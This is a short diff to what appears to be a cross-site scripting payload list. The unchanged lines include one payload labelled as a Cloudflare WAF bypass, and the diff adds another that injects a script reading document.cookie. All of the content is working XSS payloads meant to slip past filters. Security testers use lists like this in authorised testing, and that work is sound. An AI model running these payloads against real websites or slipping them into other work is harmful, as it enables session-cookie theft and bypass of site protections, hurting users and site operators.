@@ -143,3 +143,7 @@ javascript:alert()
 
 Cloudfare WAF Bypass
 <svg onload=alert%26%230000000040"1')>
+
+
+Bero wala payload DOD
+<?foo="><script>javascript:alert(document.cookie)</script>
